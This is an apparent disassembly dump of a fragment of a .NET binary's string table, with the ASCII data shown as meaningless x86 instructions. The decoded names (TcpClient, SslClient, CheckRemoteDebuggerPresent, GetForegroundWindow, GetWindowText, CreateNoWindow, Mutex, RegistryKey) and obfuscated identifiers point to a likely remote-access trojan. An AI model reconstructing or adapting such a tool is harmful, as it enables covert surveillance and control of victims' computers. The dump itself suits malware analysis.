  409973:	00 52 75             	add    %dl,0x75(%edx)
  409976:	6e                   	outsb  %ds:(%esi),(%dx)
  409977:	74 69                	je     0x4099e2
  409979:	6d                   	insl   (%dx),%es:(%edi)
  40997a:	65 48                	gs dec %eax
  40997c:	65 6c                	gs insb (%dx),%es:(%edi)
  40997e:	70 65                	jo     0x4099e5
  409980:	72 73                	jb     0x4099f5
  409982:	00 53 73             	add    %dl,0x73(%ebx)
  409985:	6c                   	insb   (%dx),%es:(%edi)
  409986:	50                   	push   %eax
  409987:	6f                   	outsl  %ds:(%esi),(%dx)
  409988:	6c                   	insb   (%dx),%es:(%edi)
  409989:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409990:	72 73                	jb     0x409a05
  409992:	00 46 69             	add    %al,0x69(%esi)
  409995:	6c                   	insb   (%dx),%es:(%edi)
  409996:	65 41                	gs inc %ecx
  409998:	63 63 65             	arpl   %esp,0x65(%ebx)
  40999b:	73 73                	jae    0x409a10
  40999d:	00 47 65             	add    %al,0x65(%edi)
  4099a0:	74 43                	je     0x4099e5
  4099a2:	75 72                	jne    0x409a16
  4099a4:	72 65                	jb     0x409a0b
  4099a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a7:	74 50                	je     0x4099f9
  4099a9:	72 6f                	jb     0x409a1a
  4099ab:	63 65 73             	arpl   %esp,0x73(%ebp)
  4099ae:	73 00                	jae    0x4099b0
  4099b0:	49                   	dec    %ecx
  4099b1:	50                   	push   %eax
  4099b2:	41                   	inc    %ecx
  4099b3:	64 64 72 65          	fs fs jb 0x409a1c
  4099b7:	73 73                	jae    0x409a2c
  4099b9:	00 53 79             	add    %dl,0x79(%ebx)
  4099bc:	73 74                	jae    0x409a32
  4099be:	65 6d                	gs insl (%dx),%es:(%edi)
  4099c0:	2e 4e                	cs dec %esi
  4099c2:	65 74 2e             	gs je  0x4099f3
  4099c5:	53                   	push   %ebx
  4099c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c7:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099ca:	74 73                	je     0x409a3f
  4099cc:	00 73 65             	add    %dh,0x65(%ebx)
  4099cf:	74 5f                	je     0x409a30
  4099d1:	41                   	inc    %ecx
  4099d2:	72 67                	jb     0x409a3b
  4099d4:	75 6d                	jne    0x409a43
  4099d6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4099d8:	74 73                	je     0x409a4d
  4099da:	00 53 79             	add    %dl,0x79(%ebx)
  4099dd:	73 74                	jae    0x409a53
  4099df:	65 6d                	gs insl (%dx),%es:(%edi)
  4099e1:	45                   	inc    %ebp
  4099e2:	76 65                	jbe    0x409a49
  4099e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e5:	74 73                	je     0x409a5a
  4099e7:	00 45 78             	add    %al,0x78(%ebp)
  4099ea:	69 73 74 73 00 51 49 	imul   $0x49510073,0x74(%ebx),%esi
  4099f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f2:	4b                   	dec    %ebx
  4099f3:	52                   	push   %edx
  4099f4:	4e                   	dec    %esi
  4099f5:	73 44                	jae    0x409a3b
  4099f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f8:	76 73                	jbe    0x409a6d
  4099fa:	00 58 68             	add    %bl,0x68(%eax)
  4099fd:	5a                   	pop    %edx
  4099fe:	6b 50 51 52          	imul   $0x52,0x51(%eax),%edx
  409a02:	61                   	popa
  409a03:	47                   	inc    %edi
  409a04:	43                   	inc    %ebx
  409a05:	47                   	inc    %edi
  409a06:	74 00                	je     0x409a08
  409a08:	79 71                	jns    0x409a7b
  409a0a:	57                   	push   %edi
  409a0b:	4c                   	dec    %esp
  409a0c:	66 79 4b             	data16 jns 0x409a5a
  409a0f:	44                   	inc    %esp
  409a10:	59                   	pop    %ecx
  409a11:	62 51 7a             	bound  %edx,0x7a(%ecx)
  409a14:	4a                   	dec    %edx
  409a15:	74 00                	je     0x409a17
  409a17:	43                   	inc    %ebx
  409a18:	6f                   	outsl  %ds:(%esi),(%dx)
  409a19:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1a:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a1d:	00 49 6d             	add    %cl,0x6d(%ecx)
  409a20:	61                   	popa
  409a21:	67 65 46             	addr16 gs inc %esi
  409a24:	6f                   	outsl  %ds:(%esi),(%dx)
  409a25:	72 6d                	jb     0x409a94
  409a27:	61                   	popa
  409a28:	74 00                	je     0x409a2a
  409a2a:	67 65 74 5f          	addr16 gs je 0x409a8d
  409a2e:	41                   	inc    %ecx
  409a2f:	73 46                	jae    0x409a77
  409a31:	6c                   	insb   (%dx),%es:(%edi)
  409a32:	6f                   	outsl  %ds:(%esi),(%dx)
  409a33:	61                   	popa
  409a34:	74 00                	je     0x409a36
  409a36:	73 65                	jae    0x409a9d
  409a38:	74 5f                	je     0x409a99
  409a3a:	41                   	inc    %ecx
  409a3b:	73 46                	jae    0x409a83
  409a3d:	6c                   	insb   (%dx),%es:(%edi)
  409a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a3f:	61                   	popa
  409a40:	74 00                	je     0x409a42
  409a42:	4d                   	dec    %ebp
  409a43:	61                   	popa
  409a44:	6e                   	outsb  %ds:(%esi),(%dx)
  409a45:	61                   	popa
  409a46:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a49:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a4b:	74 42                	je     0x409a8f
  409a4d:	61                   	popa
  409a4e:	73 65                	jae    0x409ab5
  409a50:	4f                   	dec    %edi
  409a51:	62 6a 65             	bound  %ebp,0x65(%edx)
  409a54:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409a58:	6f                   	outsl  %ds:(%esi),(%dx)
  409a59:	6c                   	insb   (%dx),%es:(%edi)
  409a5a:	6c                   	insb   (%dx),%es:(%edi)
  409a5b:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409a60:	6f                   	outsl  %ds:(%esi),(%dx)
  409a61:	6e                   	outsb  %ds:(%esi),(%dx)
  409a62:	6e                   	outsb  %ds:(%esi),(%dx)
  409a63:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409a68:	65 74 00             	gs je  0x409a6b
  409a6b:	53                   	push   %ebx
  409a6c:	79 73                	jns    0x409ae1
  409a6e:	74 65                	je     0x409ad5
  409a70:	6d                   	insl   (%dx),%es:(%edi)
  409a71:	2e 4e                	cs dec %esi
  409a73:	65 74 00             	gs je  0x409a76
  409a76:	54                   	push   %esp
  409a77:	61                   	popa
  409a78:	72 67                	jb     0x409ae1
  409a7a:	65 74 00             	gs je  0x409a7d
  409a7d:	53                   	push   %ebx
  409a7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a7f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409a82:	74 00                	je     0x409a84
  409a84:	53                   	push   %ebx
  409a85:	79 73                	jns    0x409afa
  409a87:	74 65                	je     0x409aee
  409a89:	6d                   	insl   (%dx),%es:(%edi)
  409a8a:	2e 43                	cs inc %ebx
  409a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  409a8d:	6c                   	insb   (%dx),%es:(%edi)
  409a8e:	6c                   	insb   (%dx),%es:(%edi)
  409a8f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a94:	6e                   	outsb  %ds:(%esi),(%dx)
  409a95:	73 2e                	jae    0x409ac5
  409a97:	49                   	dec    %ecx
  409a98:	45                   	inc    %ebp
  409a99:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9a:	75 6d                	jne    0x409b09
  409a9c:	65 72 61             	gs jb  0x409b00
  409a9f:	74 6f                	je     0x409b10
  409aa1:	72 2e                	jb     0x409ad1
  409aa3:	52                   	push   %edx
  409aa4:	65 73 65             	gs jae 0x409b0c
  409aa7:	74 00                	je     0x409aa9
  409aa9:	67 65 74 5f          	addr16 gs je 0x409b0c
  409aad:	4f                   	dec    %edi
  409aae:	66 66 73 65          	data16 data16 jae 0x409b17
  409ab2:	74 00                	je     0x409ab4
  409ab4:	73 65                	jae    0x409b1b
  409ab6:	74 5f                	je     0x409b17
  409ab8:	4f                   	dec    %edi
  409ab9:	66 66 73 65          	data16 data16 jae 0x409b22
  409abd:	74 00                	je     0x409abf
  409abf:	59                   	pop    %ecx
  409ac0:	72 49                	jb     0x409b0b
  409ac2:	68 52 4b 6e 6c       	push   $0x6c6e4b52
  409ac7:	68 74 00 53 70       	push   $0x70530074
  409acc:	6c                   	insb   (%dx),%es:(%edi)
  409acd:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409ad4:	00 
  409ad5:	49                   	dec    %ecx
  409ad6:	41                   	inc    %ecx
  409ad7:	73 79                	jae    0x409b52
  409ad9:	6e                   	outsb  %ds:(%esi),(%dx)
  409ada:	63 52 65             	arpl   %edx,0x65(%edx)
  409add:	73 75                	jae    0x409b54
  409adf:	6c                   	insb   (%dx),%es:(%edi)
  409ae0:	74 00                	je     0x409ae2
  409ae2:	42                   	inc    %edx
  409ae3:	46                   	inc    %esi
  409ae4:	56                   	push   %esi
  409ae5:	70 76                	jo     0x409b5d
  409ae7:	71 65                	jno    0x409b4e
  409ae9:	4b                   	dec    %ebx
  409aea:	79 6d                	jns    0x409b59
  409aec:	72 6d                	jb     0x409b5b
  409aee:	74 00                	je     0x409af0
  409af0:	54                   	push   %esp
  409af1:	6f                   	outsl  %ds:(%esi),(%dx)
  409af2:	55                   	push   %ebp
  409af3:	70 70                	jo     0x409b65
  409af5:	65 72 49             	gs jb  0x409b41
  409af8:	6e                   	outsb  %ds:(%esi),(%dx)
  409af9:	76 61                	jbe    0x409b5c
  409afb:	72 69                	jb     0x409b66
  409afd:	61                   	popa
  409afe:	6e                   	outsb  %ds:(%esi),(%dx)
  409aff:	74 00                	je     0x409b01
  409b01:	57                   	push   %edi
  409b02:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409b06:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409b0d:	74 5f                	je     0x409b6e
  409b0f:	53                   	push   %ebx
  409b10:	73 6c                	jae    0x409b7e
  409b12:	43                   	inc    %ebx
  409b13:	6c                   	insb   (%dx),%es:(%edi)
  409b14:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409b1b:	74 5f                	je     0x409b7c
  409b1d:	53                   	push   %ebx
  409b1e:	73 6c                	jae    0x409b8c
  409b20:	43                   	inc    %ebx
  409b21:	6c                   	insb   (%dx),%es:(%edi)
  409b22:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409b29:	74 5f                	je     0x409b8a
  409b2b:	54                   	push   %esp
  409b2c:	63 70 43             	arpl   %esi,0x43(%eax)
  409b2f:	6c                   	insb   (%dx),%es:(%edi)
  409b30:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409b37:	74 5f                	je     0x409b98
  409b39:	54                   	push   %esp
  409b3a:	63 70 43             	arpl   %esi,0x43(%eax)
  409b3d:	6c                   	insb   (%dx),%es:(%edi)
  409b3e:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409b45:	74 68                	je     0x409baf
  409b47:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b49:	74 69                	je     0x409bb4
  409b4b:	63 61 74             	arpl   %esp,0x74(%ecx)
  409b4e:	65 41                	gs inc %ecx
  409b50:	73 43                	jae    0x409b95
  409b52:	6c                   	insb   (%dx),%es:(%edi)
  409b53:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409b5a:	73 74                	jae    0x409bd0
  409b5c:	65 6d                	gs insl (%dx),%es:(%edi)
  409b5e:	2e 4d                	cs dec %ebp
  409b60:	61                   	popa
  409b61:	6e                   	outsb  %ds:(%esi),(%dx)
  409b62:	61                   	popa
  409b63:	67 65 6d             	gs insl (%dx),%es:(%di)
  409b66:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b68:	74 00                	je     0x409b6a
  409b6a:	45                   	inc    %ebp
  409b6b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b6c:	76 69                	jbe    0x409bd7
  409b6e:	72 6f                	jb     0x409bdf
  409b70:	6e                   	outsb  %ds:(%esi),(%dx)
  409b71:	6d                   	insl   (%dx),%es:(%edi)
  409b72:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b74:	74 00                	je     0x409b76
  409b76:	53                   	push   %ebx
  409b77:	79 73                	jns    0x409bec
  409b79:	74 65                	je     0x409be0
  409b7b:	6d                   	insl   (%dx),%es:(%edi)
  409b7c:	2e 43                	cs inc %ebx
  409b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b7f:	6c                   	insb   (%dx),%es:(%edi)
  409b80:	6c                   	insb   (%dx),%es:(%edi)
  409b81:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b86:	6e                   	outsb  %ds:(%esi),(%dx)
  409b87:	73 2e                	jae    0x409bb7
  409b89:	49                   	dec    %ecx
  409b8a:	45                   	inc    %ebp
  409b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8c:	75 6d                	jne    0x409bfb
  409b8e:	65 72 61             	gs jb  0x409bf2
  409b91:	74 6f                	je     0x409c02
  409b93:	72 2e                	jb     0x409bc3
  409b95:	67 65 74 5f          	addr16 gs je 0x409bf8
  409b99:	43                   	inc    %ebx
  409b9a:	75 72                	jne    0x409c0e
  409b9c:	72 65                	jb     0x409c03
  409b9e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9f:	74 00                	je     0x409ba1
  409ba1:	47                   	inc    %edi
  409ba2:	65 74 43             	gs je  0x409be8
  409ba5:	75 72                	jne    0x409c19
  409ba7:	72 65                	jb     0x409c0e
  409ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  409baa:	74 00                	je     0x409bac
  409bac:	43                   	inc    %ebx
  409bad:	68 65 63 6b 52       	push   $0x526b6365
  409bb2:	65 6d                	gs insl (%dx),%es:(%edi)
  409bb4:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb5:	74 65                	je     0x409c1c
  409bb7:	44                   	inc    %esp
  409bb8:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409bbc:	67 65 72 50          	addr16 gs jb 0x409c10
  409bc0:	72 65                	jb     0x409c27
  409bc2:	73 65                	jae    0x409c29
  409bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  409bc5:	74 00                	je     0x409bc7
  409bc7:	67 65 74 5f          	addr16 gs je 0x409c2a
  409bcb:	52                   	push   %edx
  409bcc:	65 6d                	gs insl (%dx),%es:(%edi)
  409bce:	6f                   	outsl  %ds:(%esi),(%dx)
  409bcf:	74 65                	je     0x409c36
  409bd1:	45                   	inc    %ebp
  409bd2:	6e                   	outsb  %ds:(%esi),(%dx)
  409bd3:	64 50                	fs push %eax
  409bd5:	6f                   	outsl  %ds:(%esi),(%dx)
  409bd6:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409bdd:	5f                   	pop    %edi
  409bde:	43                   	inc    %ebx
  409bdf:	6f                   	outsl  %ds:(%esi),(%dx)
  409be0:	75 6e                	jne    0x409c50
  409be2:	74 00                	je     0x409be4
  409be4:	67 65 74 5f          	addr16 gs je 0x409c47
  409be8:	50                   	push   %eax
  409be9:	72 6f                	jb     0x409c5a
  409beb:	63 65 73             	arpl   %esp,0x73(%ebp)
  409bee:	73 6f                	jae    0x409c5f
  409bf0:	72 43                	jb     0x409c35
  409bf2:	6f                   	outsl  %ds:(%esi),(%dx)
  409bf3:	75 6e                	jne    0x409c63
  409bf5:	74 00                	je     0x409bf7
  409bf7:	47                   	inc    %edi
  409bf8:	65 74 50             	gs je  0x409c4b
  409bfb:	61                   	popa
  409bfc:	74 68                	je     0x409c66
  409bfe:	52                   	push   %edx
  409bff:	6f                   	outsl  %ds:(%esi),(%dx)
  409c00:	6f                   	outsl  %ds:(%esi),(%dx)
  409c01:	74 00                	je     0x409c03
  409c03:	57                   	push   %edi
  409c04:	76 63                	jbe    0x409c69
  409c06:	6d                   	insl   (%dx),%es:(%edi)
  409c07:	76 69                	jbe    0x409c72
  409c09:	6b 74 52 4e 57       	imul   $0x57,0x4e(%edx,%edx,2),%esi
  409c0e:	70 74                	jo     0x409c84
  409c10:	00 50 61             	add    %dl,0x61(%eax)
  409c13:	72 61                	jb     0x409c76
  409c15:	6d                   	insl   (%dx),%es:(%edi)
  409c16:	65 74 65             	gs je  0x409c7e
  409c19:	72 69                	jb     0x409c84
  409c1b:	7a 65                	jp     0x409c82
  409c1d:	64 54                	fs push %esp
  409c1f:	68 72 65 61 64       	push   $0x64616572
  409c24:	53                   	push   %ebx
  409c25:	74 61                	je     0x409c88
  409c27:	72 74                	jb     0x409c9d
  409c29:	00 43 6f             	add    %al,0x6f(%ebx)
  409c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  409c2d:	76 65                	jbe    0x409c94
  409c2f:	72 74                	jb     0x409ca5
  409c31:	00 46 61             	add    %al,0x61(%esi)
  409c34:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409c3b:	54 
  409c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  409c3d:	4c                   	dec    %esp
  409c3e:	69 73 74 00 62 63 65 	imul   $0x65636200,0x74(%ebx),%esi
  409c45:	51                   	push   %ecx
  409c46:	72 68                	jb     0x409cb0
  409c48:	64 4d                	fs dec %ebp
  409c4a:	74 74                	je     0x409cc0
  409c4c:	00 6a 67             	add    %ch,0x67(%edx)
  409c4f:	79 74                	jns    0x409cc5
  409c51:	43                   	inc    %ebx
  409c52:	6d                   	insl   (%dx),%es:(%edi)
  409c53:	74 43                	je     0x409c98
  409c55:	4e                   	dec    %esi
  409c56:	75 74                	jne    0x409ccc
  409c58:	00 53 79             	add    %dl,0x79(%ebx)
  409c5b:	73 74                	jae    0x409cd1
  409c5d:	65 6d                	gs insl (%dx),%es:(%edi)
  409c5f:	2e 43                	cs inc %ebx
  409c61:	6f                   	outsl  %ds:(%esi),(%dx)
  409c62:	6c                   	insb   (%dx),%es:(%edi)
  409c63:	6c                   	insb   (%dx),%es:(%edi)
  409c64:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409c69:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6a:	73 2e                	jae    0x409c9a
  409c6c:	49                   	dec    %ecx
  409c6d:	45                   	inc    %ebp
  409c6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6f:	75 6d                	jne    0x409cde
  409c71:	65 72 61             	gs jb  0x409cd5
  409c74:	74 6f                	je     0x409ce5
  409c76:	72 2e                	jb     0x409ca6
  409c78:	4d                   	dec    %ebp
  409c79:	6f                   	outsl  %ds:(%esi),(%dx)
  409c7a:	76 65                	jbe    0x409ce1
  409c7c:	4e                   	dec    %esi
  409c7d:	65 78 74             	gs js  0x409cf4
  409c80:	00 53 79             	add    %dl,0x79(%ebx)
  409c83:	73 74                	jae    0x409cf9
  409c85:	65 6d                	gs insl (%dx),%es:(%edi)
  409c87:	2e 54                	cs push %esp
  409c89:	65 78 74             	gs js  0x409d00
  409c8c:	00 47 65             	add    %al,0x65(%edi)
  409c8f:	74 57                	je     0x409ce8
  409c91:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409c98:	78 74                	js     0x409d0e
  409c9a:	00 4c 61 79          	add    %cl,0x79(%ecx,%eiz,2)
  409c9e:	58                   	pop    %eax
  409c9f:	54                   	push   %esp
  409ca0:	41                   	inc    %ecx
  409ca1:	78 53                	js     0x409cf6
  409ca3:	5a                   	pop    %edx
  409ca4:	75 00                	jne    0x409ca6
  409ca6:	70 65                	jo     0x409d0d
  409ca8:	53                   	push   %ebx
  409ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  409caa:	43                   	inc    %ebx
  409cab:	4f                   	dec    %edi
  409cac:	42                   	inc    %edx
  409cad:	49                   	dec    %ecx
  409cae:	44                   	inc    %esp
  409caf:	50                   	push   %eax
  409cb0:	77 64                	ja     0x409d16
  409cb2:	75 00                	jne    0x409cb4
  409cb4:	4e                   	dec    %esi
  409cb5:	6e                   	outsb  %ds:(%esi),(%dx)
  409cb6:	62 72 4d             	bound  %esi,0x4d(%edx)
  409cb9:	79 6c                	jns    0x409d27
  409cbb:	6c                   	insb   (%dx),%es:(%edi)
  409cbc:	55                   	push   %ebp
  409cbd:	75 66                	jne    0x409d25
  409cbf:	75 00                	jne    0x409cc1
  409cc1:	54                   	push   %esp
  409cc2:	71 70                	jno    0x409d34
  409cc4:	4c                   	dec    %esp
  409cc5:	4b                   	dec    %ebx
  409cc6:	6c                   	insb   (%dx),%es:(%edi)
  409cc7:	56                   	push   %esi
  409cc8:	72 51                	jb     0x409d1b
  409cca:	42                   	inc    %edx
  409ccb:	49                   	dec    %ecx
  409ccc:	4b                   	dec    %ebx
  409ccd:	6b 75 00 4a          	imul   $0x4a,0x0(%ebp),%esi
  409cd1:	58                   	pop    %eax
  409cd2:	6a 61                	push   $0x61
  409cd4:	65 53                	gs push %ebx
  409cd6:	71 79                	jno    0x409d51
  409cd8:	4c                   	dec    %esp
  409cd9:	76 00                	jbe    0x409cdb
  409cdb:	67 4c                	addr16 dec %esp
  409cdd:	48                   	dec    %eax
  409cde:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdf:	46                   	inc    %esi
  409ce0:	55                   	push   %ebp
  409ce1:	78 72                	js     0x409d55
  409ce3:	77 79                	ja     0x409d5e
  409ce5:	62 76 00             	bound  %esi,0x0(%esi)
  409ce8:	75 44                	jne    0x409d2e
  409cea:	65 72 61             	gs jb  0x409d4e
  409ced:	48                   	dec    %eax
  409cee:	5a                   	pop    %edx
  409cef:	7a 45                	jp     0x409d36
  409cf1:	64 76 00             	fs jbe 0x409cf4
  409cf4:	4a                   	dec    %edx
  409cf5:	49                   	dec    %ecx
  409cf6:	79 79                	jns    0x409d71
  409cf8:	6d                   	insl   (%dx),%es:(%edi)
  409cf9:	52                   	push   %edx
  409cfa:	6f                   	outsl  %ds:(%esi),(%dx)
  409cfb:	51                   	push   %ecx
  409cfc:	69 43 70 77 68 76 00 	imul   $0x766877,0x70(%ebx),%eax
  409d03:	58                   	pop    %eax
  409d04:	70 56                	jo     0x409d5c
  409d06:	6c                   	insb   (%dx),%es:(%edi)
  409d07:	67 50                	addr16 push %eax
  409d09:	64 64 70 66          	fs fs jo 0x409d73
  409d0d:	7a 76                	jp     0x409d85
  409d0f:	00 65 6b             	add    %ah,0x6b(%ebp)
  409d12:	74 49                	je     0x409d5d
  409d14:	67 72 78             	addr16 jb 0x409d8f
  409d17:	4a                   	dec    %edx
  409d18:	6c                   	insb   (%dx),%es:(%edi)
  409d19:	61                   	popa
  409d1a:	65 66 53             	gs push %bx
  409d1d:	71 44                	jno    0x409d63
  409d1f:	77 00                	ja     0x409d21
  409d21:	73 59                	jae    0x409d7c
  409d23:	63 49 4c             	arpl   %ecx,0x4c(%ecx)
  409d26:	46                   	inc    %esi
  409d27:	71 49                	jno    0x409d72
  409d29:	49                   	dec    %ecx
  409d2a:	64 57                	fs push %edi
  409d2c:	6c                   	insb   (%dx),%es:(%edi)
  409d2d:	5a                   	pop    %edx
  409d2e:	77 00                	ja     0x409d30
  409d30:	47                   	inc    %edi
  409d31:	65 74 46             	gs je  0x409d7a
  409d34:	6f                   	outsl  %ds:(%esi),(%dx)
  409d35:	72 65                	jb     0x409d9c
  409d37:	67 72 6f             	addr16 jb 0x409da9
  409d3a:	75 6e                	jne    0x409daa
  409d3c:	64 57                	fs push %edi
  409d3e:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409d45:	65 74 5f             	gs je  0x409da7
  409d48:	43                   	inc    %ebx
  409d49:	72 65                	jb     0x409db0
  409d4b:	61                   	popa
  409d4c:	74 65                	je     0x409db3
  409d4e:	4e                   	dec    %esi
  409d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d50:	57                   	push   %edi
  409d51:	69 6e 64 6f 77 00 53 	imul   $0x5300776f,0x64(%esi),%ebp
  409d58:	43                   	inc    %ebx
  409d59:	44                   	inc    %esp
  409d5a:	77 64                	ja     0x409dc0
  409d5c:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5d:	52                   	push   %edx
  409d5e:	4f                   	dec    %edi
  409d5f:	65 77 55             	gs ja  0x409db7
  409d62:	4a                   	dec    %edx
  409d63:	78 00                	js     0x409d65
  409d65:	75 6c                	jne    0x409dd3
  409d67:	73 57                	jae    0x409dc0
  409d69:	58                   	pop    %eax
  409d6a:	71 74                	jno    0x409de0
  409d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409d6d:	62 50 62             	bound  %edx,0x62(%eax)
  409d70:	62 53 78             	bound  %edx,0x78(%ebx)
  409d73:	00 4d 75             	add    %cl,0x75(%ebp)
  409d76:	74 65                	je     0x409ddd
  409d78:	78 00                	js     0x409d7a
  409d7a:	48                   	dec    %eax
  409d7b:	76 75                	jbe    0x409df2
  409d7d:	4b                   	dec    %ebx
  409d7e:	69 61 79 72 41 50 68 	imul   $0x68504172,0x79(%ecx),%esp
  409d85:	79 63                	jns    0x409dea
  409d87:	6b 78 00 4e          	imul   $0x4e,0x0(%eax),%edi
  409d8b:	78 45                	js     0x409dd2
  409d8d:	65 6c                	gs insb (%dx),%es:(%edi)
  409d8f:	62 4f 43             	bound  %ecx,0x43(%edi)
  409d92:	7a 59                	jp     0x409ded
  409d94:	57                   	push   %edi
  409d95:	4b                   	dec    %ebx
  409d96:	79 00                	jns    0x409d98
  409d98:	52                   	push   %edx
  409d99:	6c                   	insb   (%dx),%es:(%edi)
  409d9a:	6c                   	insb   (%dx),%es:(%edi)
  409d9b:	6c                   	insb   (%dx),%es:(%edi)
  409d9c:	51                   	push   %ecx
  409d9d:	73 49                	jae    0x409de8
  409d9f:	4e                   	dec    %esi
  409da0:	55                   	push   %ebp
  409da1:	55                   	push   %ebp
  409da2:	79 00                	jns    0x409da4
  409da4:	4b                   	dec    %ebx
  409da5:	4c                   	dec    %esp
  409da6:	49                   	dec    %ecx
  409da7:	6b 79 74 5a          	imul   $0x5a,0x74(%ecx),%edi
  409dab:	58                   	pop    %eax
  409dac:	58                   	pop    %eax
  409dad:	5a                   	pop    %edx
  409dae:	54                   	push   %esp
  409daf:	43                   	inc    %ebx
  409db0:	56                   	push   %esi
  409db1:	79 00                	jns    0x409db3
  409db3:	6e                   	outsb  %ds:(%esi),(%dx)
  409db4:	46                   	inc    %esi
  409db5:	54                   	push   %esp
  409db6:	4e                   	dec    %esi
  409db7:	64 73 4d             	fs jae 0x409e07
  409dba:	55                   	push   %ebp
  409dbb:	7a 6e                	jp     0x409e2b
  409dbd:	43                   	inc    %ebx
  409dbe:	63 44 56 79          	arpl   %eax,0x79(%esi,%edx,2)
  409dc2:	00 4e 4f             	add    %cl,0x4f(%esi)
  409dc5:	6b 55 55 49          	imul   $0x49,0x55(%ebp),%edx
  409dc9:	72 74                	jb     0x409e3f
  409dcb:	5a                   	pop    %edx
  409dcc:	79 00                	jns    0x409dce
  409dce:	49                   	dec    %ecx
  409dcf:	6e                   	outsb  %ds:(%esi),(%dx)
  409dd0:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409dd7:	65 
  409dd8:	41                   	inc    %ecx
  409dd9:	72 72                	jb     0x409e4d
  409ddb:	61                   	popa
  409ddc:	79 00                	jns    0x409dde
  409dde:	54                   	push   %esp
  409ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  409de0:	41                   	inc    %ecx
  409de1:	72 72                	jb     0x409e55
  409de3:	61                   	popa
  409de4:	79 00                	jns    0x409de6
  409de6:	67 65 74 5f          	addr16 gs je 0x409e49
  409dea:	41                   	inc    %ecx
  409deb:	73 41                	jae    0x409e2e
  409ded:	72 72                	jb     0x409e61
  409def:	61                   	popa
  409df0:	79 00                	jns    0x409df2
  409df2:	67 65 74 5f          	addr16 gs je 0x409e55
  409df6:	4b                   	dec    %ebx
  409df7:	65 79 00             	gs jns 0x409dfa
  409dfa:	73 65                	jae    0x409e61
  409dfc:	74 5f                	je     0x409e5d
  409dfe:	4b                   	dec    %ebx
  409dff:	65 79 00             	gs jns 0x409e02
  409e02:	43                   	inc    %ebx
  409e03:	72 65                	jb     0x409e6a
  409e05:	61                   	popa
  409e06:	74 65                	je     0x409e6d
  409e08:	53                   	push   %ebx
  409e09:	75 62                	jne    0x409e6d
  409e0b:	4b                   	dec    %ebx
  409e0c:	65 79 00             	gs jns 0x409e0f
  409e0f:	4f                   	dec    %edi
  409e10:	70 65                	jo     0x409e77
  409e12:	6e                   	outsb  %ds:(%esi),(%dx)
  409e13:	53                   	push   %ebx
  409e14:	75 62                	jne    0x409e78
  409e16:	4b                   	dec    %ebx
  409e17:	65 79 00             	gs jns 0x409e1a
  409e1a:	67 65 74 5f          	addr16 gs je 0x409e7d
  409e1e:	50                   	push   %eax
  409e1f:	75 62                	jne    0x409e83
  409e21:	6c                   	insb   (%dx),%es:(%edi)
  409e22:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409e29:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409e30:	4b 65 
  409e32:	79 00                	jns    0x409e34
  409e34:	47                   	inc    %edi
  409e35:	76 59                	jbe    0x409e90
  409e37:	6a 72                	push   $0x72
  409e39:	46                   	inc    %esi
